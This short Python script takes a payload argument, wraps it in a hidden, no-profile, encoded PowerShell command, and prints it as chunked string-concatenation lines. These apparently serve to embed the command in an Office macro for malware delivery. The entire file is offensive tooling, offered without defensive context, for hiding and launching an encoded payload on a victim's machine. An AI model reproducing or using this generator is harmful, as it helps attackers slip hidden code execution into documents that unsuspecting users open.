import sys

payload = sys.argv[1]

str = "powershell.exe -nop -w hidden -e " + payload


n = 50

for i in range(0, len(str), n):
	print ("Str = Str + " + '"' + str[i:i+n] + '"')
